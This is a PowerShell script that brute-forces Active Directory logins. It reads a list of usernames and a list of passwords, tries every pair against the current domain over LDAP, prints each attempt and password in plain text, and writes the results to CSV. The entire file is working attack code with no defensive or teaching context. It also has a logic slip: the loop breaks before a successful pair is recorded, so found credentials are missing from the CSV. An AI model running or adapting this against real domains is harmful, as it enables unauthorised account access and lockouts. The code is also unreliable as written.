param (
    [Parameter(Mandatory=$true)]
    [string]$UserListPath,

    [Parameter(Mandatory=$true)]
    [string]$PasswordListPath,

    [Parameter(Mandatory=$true)]
    [string]$OutputFilePath
)

$userList = Get-Content -Path $UserListPath
$passwordList = Get-Content -Path $PasswordListPath
$results = @()

foreach ($user in $userList) {
    foreach ($password in $passwordList) {
        $pass = ConvertTo-SecureString $password -AsPlainText -Force
        $plaintext = (New-Object System.Management.Automation.PSCredential 'N/A',$pass).GetNetworkCredential().Password
        $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
        $domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$user,$plaintext)

        Write-Host "Checking credentials for $user with password: $password..." -ForegroundColor Cyan

        if ($domain.name -eq $null){
            $output = "Fail"
            $message = "[-] Failed to authenticate $user using password:$password"
            Write-Host $message -ForegroundColor Red
        }
        else {
            $output = "Success"
            $message = "[*] Successfully authenticated user:$user using password:$password"
            Write-Host $message -ForegroundColor Green
            # If authenticated, no need to continue with other passwords
            break
        }

        $results += [PSCustomObject]@{
            Username = $user
            Password = $password
            Status = $output
        }
    }
}

$results | Export-Csv -Path $OutputFilePath -NoTypeInformation
